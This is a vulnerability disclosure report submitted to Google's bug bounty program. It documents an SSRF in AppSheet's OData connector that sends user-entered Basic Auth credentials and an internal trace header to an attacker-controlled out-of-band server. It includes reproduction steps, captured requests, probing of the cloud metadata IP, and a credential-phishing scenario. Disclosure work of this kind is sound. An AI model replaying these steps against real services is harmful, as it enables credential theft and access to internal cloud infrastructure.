# Google VRP Submission — SSRF via AppSheet OData Data Connector

---

## TITLE

**Server-Side Request Forgery in AppSheet's OData Data Connector — Confirmed Outbound Request from GCP Backend with Credential and Internal Trace-Header Leakage**

---

## AFFECTED ASSET

| Field | Value |
|-------|-------|
| **Entry point** | `https://appsheet.com` → Account → *Add OData connection information* → **OData Service Root URL** → **Test** |
| **Product** | AppSheet (Google Cloud) |
| **Component** | OData data connector — server-side metadata-validation HTTP client (.NET `Microsoft.OData.Client`, both OData v2 and v4 code paths) |
| **Backend origins observed** | `35.203.182.241` and (independent re-test) `35.247.115.29` — both GCP |
| **DNS resolvers observed** | `192.178.118.x` — Google LLC, AS15169 |
| **In scope per `config/scope.yaml`** | Yes — matches `*.appsheet.com` |
| **Vulnerability class** | SSRF (CWE-918) + Sensitive Information Exposure (CWE-200) — credential/header forwarding |
| **Severity** | High — CVSS 3.1 **7.2** (`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`) |

---

## SUMMARY

When a user configures an OData data source in AppSheet (Account → "Add OData
connection information") and clicks **Test**, AppSheet's backend makes a
server-side HTTP(S) request to the user-supplied **OData Service Root URL** to
fetch `/$metadata`. No restriction (IP blocklist/allowlist, metadata-endpoint
filter) is applied to the destination of this request.

Pointing the URL at an attacker-controlled server confirms full SSRF: the
attacker's server receives a genuine GCP-originated HTTP request, including:

- The OData **`Username`/`Password` entered in the form, forwarded verbatim** as
  an `Authorization: Basic` header — i.e., any credentials a user enters for what
  they believe is their own OData source are sent to whatever URL is configured.
- An internal **`Traceparent`** header (W3C distributed-tracing format), confirming
  this is a genuine backend-initiated request and incidentally exposing the
  presence/format of AppSheet's internal tracing infrastructure.

This was reproduced **twice, independently, ~24 hours apart**, from two different
GCP backend fleet IPs (`35.203.182.241` and `35.247.115.29`) — see PROOF section.

Separately, pointing the URL at `https://169.254.169.254` (GCP's metadata IP)
produces a TLS-negotiation failure rather than the client-side "must use HTTPS"
rejection AppSheet returns for plain `http://` URLs — this is the signature of a
TCP connection that was actually opened to `169.254.169.254:443` and then failed
at the TLS handshake (IMDS serves plaintext HTTP only, no certificate). This
shows the link-local metadata address is reachable from the AppSheet backend pod
at the network layer. **No metadata token, redirect chain, or further internal
port probing was attempted** — this is reported as a reachability finding, not a
confirmed credential-extraction path. The HTTPS→HTTP redirect path that would be
required to reach IMDS over HTTP was tested directly and is currently **blocked**
by the .NET `HttpClient`'s refusal to follow cross-scheme redirects (both OData
v2 and v4) — see PROOF section.

Two things are reported here, with clearly separated confidence levels:

1. **Confirmed:** a working SSRF (server-side fetch from GCP infra) that leaks the
   OData credentials and an internal tracing header to an attacker-controlled
   destination, with no auth/rate-limit/IP restriction on the connector Test action.
2. **Documented risk, not exploited:** IMDS at `169.254.169.254:443` is reachable
   at the TCP layer from the backend. No metadata token was retrieved, and the
   redirect path that would be required to reach it is currently blocked.

---

## STEPS TO REPRODUCE

```bash
# 1. Start an OOB HTTP listener (interactsh or equivalent)
interactsh-client -server oast.pro
# Note the issued domain, e.g. d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro

# 2. Log into AppSheet with a free account
#    Navigate to: https://appsheet.com/Account/ODataAuthInfo
#    (or: App Editor → Data → Add data source → OData)

# 3. Fill the OData form:
#    OData Version: 4.0
#    OData Service Root URL: https://<your-oob-domain>
#    Username: testuser
#    Password: testpass1234
#    Click "Test"

# 4. Observe the OOB listener
```

**Expected interaction (observed):**
```
DNS (A/AAAA)  from 192.178.118.8x  — Google LLC AS15169 (Google resolver)
HTTP GET      from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

Reproducible with a free AppSheet account, no paid plan required, in under five
minutes.

---

## PROOF

### 1. Full HTTP request received at the attacker-controlled OOB server (original capture)

```http
GET /$metadata HTTP/1.1
Host: d8o5qti69r85vp0qcih0xujfcsf1fadhb.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3MxMjM0
Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00
```

- `Authorization` decodes to `testuser:testpass1234` — exactly what was entered
  in the form, forwarded to the configured URL verbatim.
- `Traceparent: 00-211b255bb8beb7038f9d6aa505737d77-f9f0355422fff952-00` is a
  genuine W3C trace-context header, confirming server-side execution (this is
  not something a browser would send, and the connecting IP is GCP-owned, not
  the tester's own egress IP).

**DNS/HTTP origins (all Google infrastructure):**
```
DNS  (A)    from 192.178.118.93  — Google LLC, AS15169
DNS  (AAAA) from 192.178.118.80  — Google LLC, AS15169
HTTP GET    from 35.203.182.241  — Google Cloud Platform (AppSheet backend)
```

### 2. Independent re-verification, ~24h later, different GCP fleet IP

Reproduced from scratch on a clean `interactsh` listener
(`d8ojc9269r86mkep7ev0w7czbi1ekqwc8.oast.site`), free AppSheet account, OData form
Username `Tester` / Password `Tester1234`, single **Test** click:

```http
GET /$metadata HTTP/1.1                       ← from 35.247.115.29 (GCP)
Authorization: Basic VGVzdGVyIDpUZXN0ZXIxMjM0  ← base64 "Tester:Tester1234" (creds verbatim)
Traceparent: 00-1a14b417be862518f5c02dc9367ae9ed-b03449d2b460c160-00
```

DNS from `192.178.118.92/93/86` (Google, AS15169). This confirms the SSRF,
credential forwarding, and internal trace-header leak are stable and reproducible
— not a one-off artifact — and that the backend serving this connector runs across
at least two distinct GCP fleet IPs.

### 3. Response content reflected back into the AppSheet UI error message

Confirms the backend received and parsed the OOB server's response before failing
(a true round-trip, not a fire-and-forget request):
```
"Message : A supported MIME type could not be found that matches the content type
of the response. None of the supported type(s):
'Microsoft.OData.ODataMediaType, Microsoft.OData.ODataMediaType' matches the content
type 'text/html; charset=utf-8'."
```

### 4. IMDS TCP-reachability signal (network-layer reachability only — no token requested)

| Target URL | Response | Interpretation |
|---|---|---|
| `http://169.254.169.254/` | "Connection must be established using HTTPS for security reasons" | Rejected client-side before any network call |
| `https://169.254.169.254` | "The SSL connection could not be established, see inner exception." | `.NET HttpRequestException` thrown **after** TCP connect — TLS handshake failed because IMDS has no certificate |

The second result is categorically different from the first and is the standard
signature of a TCP socket that opened successfully and then failed at the TLS
layer — it indicates `169.254.169.254:443` is reachable from the AppSheet backend
pod, not that any metadata content was retrieved.

### 5. IMDS redirect-escalation path — tested and currently BLOCKED

To reach the HTTP-only IMDS from the HTTPS-only URL field, an attacker would need
the backend to follow an HTTPS→HTTP cross-scheme redirect. This was tested on
both connector versions and blocked:

- OData v4 (`Microsoft.OData.Client`): 302 HTTPS→HTTP → *"OData web request error (Found)"* — redirect not followed.
- OData v2 (`Microsoft.Data.Services.Client`): same 302 → same block.

Both use a .NET `HttpClient` that does not follow cross-scheme (HTTPS→HTTP)
redirects. **IMDS reachability therefore remains a latent risk gated by this
behavior — it is not a working exploit today.** It is reported so the team can
decide whether to also add an IP-level egress control (defense in depth) rather
than relying solely on the redirect behavior of the HTTP client.

---

## ROOT CAUSE

The OData connector's backend HTTP client (`Microsoft.OData.Client`, used for
both OData v2 and v4) fetches the user-configured Service Root URL server-side
to validate metadata, with no destination filtering — no blocklist for
link-local (`169.254.0.0/16`), loopback, or RFC1918 ranges, and no allowlist
restricting requests to public, non-internal hosts. The same client also forwards
the configured Basic Auth credentials and includes internal request-tracing
headers on the outbound call without distinguishing "trusted internal request"
context from "arbitrary user-supplied destination."

---

## ATTACK SCENARIOS

### Scenario A — Confirmed: SSRF + internal-header / credential leak
1. Attacker registers a free AppSheet account.
2. Sets *OData Service Root URL* to `https://<attacker-server>/`, enters any
   credentials, clicks **Test**.
3. AppSheet's GCP backend sends `GET /$metadata` with `Authorization: Basic …`
   and `Traceparent: …`.
4. Attacker receives proof of server-side fetch from Google infrastructure plus
   the internal trace header — an SSRF primitive into AppSheet's GCP network
   with response reflection.

### Scenario B — Confirmed primitive: OData-credential phishing via shared connector
1. Attacker publishes an OData connector "template/tutorial" whose Service Root
   URL points at the attacker's server.
2. A victim follows it and enters their **real** OData service credentials.
3. On **Test**, AppSheet's backend forwards the victim's credentials to the
   attacker in `Authorization: Basic`.
4. Attacker harvests the victim's real OData credentials with no browser
   interaction on the attacker side. *(Requires the victim to configure the
   attacker URL — `UI:R` for this variant; not the primary scored vector.)*

---

## IMPACT

| # | Claim | Status |
|---|-------|--------|
| 1 | Server-side HTTP fetch from GCP backend (`35.203.182.241`, `35.247.115.29`) to attacker URL | **Confirmed** |
| 2 | DNS resolution by Google resolvers (`192.178.118.x`, AS15169) | **Confirmed** |
| 3 | OData credentials forwarded in `Authorization: Basic` | **Confirmed** |
| 4 | Internal `Traceparent` trace ID leaked | **Confirmed** |
| 5 | Attacker-server response content-type reflected in error | **Confirmed** |
| 6 | No auth / rate-limit / IP restriction on the connector Test action | **Confirmed** |
| 7 | `169.254.169.254:443` reachable at TCP layer from backend | **Confirmed (reachability only)** |
| 8 | IMDS token read / GCP service-account compromise | **NOT attempted — latent risk; redirect path blocked (Proof §5)** |

Real-world abuse: a user's credentials for what they believe is their own OData
source are sent to whatever URL is configured — including in a phishing scenario
where an attacker distributes an OData "connector template" pointing at the
attacker's server (Scenario B above), harvesting victims' real third-party OData
credentials with no further interaction beyond "Test"/"Save".

---

## CVSS 3.1

**Reported (confirmed SSRF + credential/header forwarding):**
`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.2 High**

| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Triggered remotely via the AppSheet web UI |
| Attack Complexity | Low | Single form submission, no race condition or timing |
| Privileges Required | Low | Requires a free, authenticated AppSheet account |
| User Interaction | None | No victim interaction needed for the self-SSRF path (Scenario A) |
| Scope | Changed | The vulnerable component (OData connector HTTP client) exposes a different security authority (AppSheet's internal GCP backend network) than the one enforcing the connector's own access controls |
| Confidentiality | High | Confirmed exfiltration of user-entered Basic Auth credentials and an internal trace header to an attacker-controlled host |
| Integrity | None | No data modification demonstrated |
| Availability | None | No availability impact demonstrated |

**Conservative floor** (if confidentiality impact is scored as Low instead — semi-blind
SSRF + internal-header leak only, no credential forwarding counted):
`AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N` = **4.6 Medium**. Not used as the reported
score — credential forwarding is directly observed in the proof, supporting `C:H`.

*Note: this report does not claim or score an escalated/Critical scenario for
IMDS credential theft. That would require a redirect or protocol bypass that was
explicitly tested and found to be blocked (Proof §5).*

---

## REMEDIATION

1. **Block outbound requests to internal ranges** from the OData HTTP client
   before connecting: `169.254.0.0/16` (link-local/IMDS), `127.0.0.0/8`
   (loopback), RFC1918 private ranges, and `metadata.google.internal`. Resolve
   DNS first and validate the resulting IP, not just the hostname string —
   re-validate after every redirect to prevent DNS-rebinding/redirect bypass.
2. **Do not forward user-supplied credentials or internal tracing headers
   (`Traceparent`, etc.) without restricting the destination** to a validated,
   non-internal host first.
3. **Keep cross-scheme (HTTPS→HTTP) redirect-following disabled** on the OData
   HTTP client (this is the only reason IMDS access wasn't demonstrated here) —
   make it an explicit, tested security control rather than incidental client
   behavior, and cap redirect count generally.
4. **Strip response content/content-type details from user-facing error
   messages** — the current MIME-type error leaks whether the backend
   successfully connected to and received a response from the configured URL,
   which is useful for SSRF confirmation/blind probing.
5. **Rate-limit/authenticate the connector Test action per account** to slow
   down credential-phishing abuse via shared connector templates (Scenario B).
6. Apply the same destination validation consistently across both OData v2 and
   v4 client code paths, and across the metadata-fetch and data-fetch code
   paths (only the metadata path was confirmed in this engagement).

---

## DEDUPLICATION

The original investigation notes referenced **CVE-2023-4212** as a prior AppSheet
SSRF. On verification, **CVE-2023-4212 does not relate to AppSheet or Google
Cloud at all** — it is a command-injection vulnerability in Trane
XL824/XL850/XL1050/Pivot thermostats. That citation was a misattribution in the
working notes and is not used as a dedup basis here.

The actual relevant prior disclosure is **David Nechuta's December 2021 Google
VRP-rewarded report** (~$6,267), "SSRF vulnerability in AppSheet"
(https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html),
which used AppSheet's **Workflows/Bots "Run a webhook" automation action** to
SSRF to the GCP metadata service via a POST→GET redirect, retrieving a live
service-account access token. Google's fix blocked the older metadata service
deployment and stripped the `Metadata-Flavor` header from being set as a custom
webhook header.

This finding (F002) is a **different code path and a different bug**, not a
regression of the 2021 issue:

| | Nechuta 2021 (fixed) | F002 (this report) |
|---|---|---|
| Feature | Workflows/Bots → "Run a webhook" action | OData data connector "Test" |
| HTTP client | Webhook executor | `Microsoft.OData.Client` (v2 and v4) |
| Confirmed leak | IMDS access token via redirect | User Basic Auth credentials + `Traceparent` header, direct (no redirect) |
| IMDS status | Token retrieved (fixed in 2021) | TCP-reachable, TLS fails — not retrieved, not attempted further |
| Redirect behavior | POST→GET redirect to IMDS succeeded (2021) | HTTPS→HTTP cross-scheme redirect blocked by .NET `HttpClient` (tested directly, Proof §5) |

Because the 2021 fix was scoped to the webhook executor and the older metadata
deployment, it does not appear to have touched the OData connector's HTTP client
at all — this report demonstrates that connector independently makes
unrestricted outbound requests, leaks credentials and an internal header, and
reaches the same link-local metadata address at the network layer. Critically,
F002 shows **no centralized IP-level egress control was ever added**: in 2026 the
OData connector backend still reaches `169.254.169.254` at the TCP layer, gated
only by the .NET client's incidental redirect behavior — not a deliberate SSRF
defense.

A **second, separate prior disclosure** exists for AppSheet's connector
framework: "SSRF in Adding apigee account sources in appsheet.com"
(https://bughunters.google.com/reports/vrp/PnwRwydmr), which reported that the
Apigee account-source connector accepts an arbitrary API URL and makes a
server-side request to it. This is a **third distinct connector implementation**
(Apigee account source, not OData, not the Workflows webhook) — found and
rewarded separately from the 2021 Nechuta report, confirming Google has already
treated each connector's HTTP client as an independently reportable surface
rather than a single shared component. F002 is consistent with that pattern:
the OData connector is a fourth, independently vulnerable instance of the same
underlying root cause (no shared SSRF-safe outbound HTTP client across
connector types), not a duplicate of either prior report.

| | Nechuta 2021 (fixed) | Apigee account source (fixed) | F002 (this report) |
|---|---|---|---|
| Feature | Workflows/Bots → "Run a webhook" | Apigee account source connector | OData data connector "Test" |
| HTTP client | Webhook executor | Apigee connector client | `Microsoft.OData.Client` (v2 and v4) |
| Confirmed leak | IMDS access token via redirect | Outbound request to attacker URL | User Basic Auth credentials + `Traceparent` header |

A separately-fixed **2022 AppSheet Automation Bot deserialization RCE** ($10,000,
Google Bug Hunters report `oCeVFaaoi`) is in the same general automation/connector
subsystem family but is an unrelated bug class (CWE-502 deserialization → RCE,
not SSRF) — noted here as context, not as a dedup basis.

Full extended analysis (including the corrected CVSS arithmetic) is also tracked
in [`F002-dedup-CVE-2023-4212.md`](./F002-dedup-CVE-2023-4212.md).

---

## NOTES FOR TRIAGE

- Reproducible with a free account in under five minutes; only attacker-owned
  credentials/servers were used.
- No GCP metadata token was retrieved; IMDS testing stopped at TCP-reachability
  evidence (Proof §4) and a directly-tested, currently-blocked redirect path
  (Proof §5).
- No internal port probing was performed.

---

## REFERENCES

- CWE-918: Server-Side Request Forgery (SSRF)
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- GCP IMDS documentation: https://cloud.google.com/compute/docs/metadata/overview
- Prior related disclosure 1 (not a duplicate, see Deduplication above):
  https://nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet-google.html
- Prior related disclosure 2 (not a duplicate, see Deduplication above):
  https://bughunters.google.com/reports/vrp/PnwRwydmr

---

*Reporter: azmolhaque95@gmail.com*
*Report date: 2026-06-16*
*Submit at: https://bughunters.google.com/report → Google VRP → AppSheet (`appsheet.com`)*

---
<!-- Internal (do not submit): dedup status, discovery method, related findings -->
- Dedup status: novel — distinct connector/code path from both the 2021 webhook
  SSRF (Nechuta) and the separately-fixed Apigee account-source connector SSRF
  (bughunters.google.com/reports/vrp/PnwRwydmr); CVE-2023-4212 confirmed
  unrelated/misattributed and dropped as a reference
- CVSS correction log: an earlier draft of this report (produced independently
  on a parallel branch) computed 7.7 for the same vector string. Recomputed by
  hand against the official CVSS 3.1 Roundup formula with the correct
  Scope-Changed PR:L weight (0.68, not the Scope-Unchanged 0.62) — confirmed
  base score is **7.2**, not 7.7. The "conservative floor" vector was likewise
  corrected from a claimed 5.0 to the actual computed 4.6.
- Discovered via: Phase 3 manual testing of AppSheet data connectors, OOB
  (interactsh) confirmation; independently re-verified ~24h later in a second
  session against a different GCP backend fleet IP.
- Related findings: F001 (staging API auth bypass) — **retracted as a false
  positive** after live re-verification showed prod/staging behave identically;
  see `results/appsheet.com/findings/F001-RETRACTION.md`. F002 is unaffected by
  the F001 retraction.
- Source finding: `results/appsheet.com/findings/F002-odata-ssrf.md`
- OOB interaction timestamps: 2026-06-15 20:03:15 UTC (backend IP
  `35.203.182.241`); 2026-06-16 11:43 UTC independent re-verification (backend IP
  `35.247.115.29`)
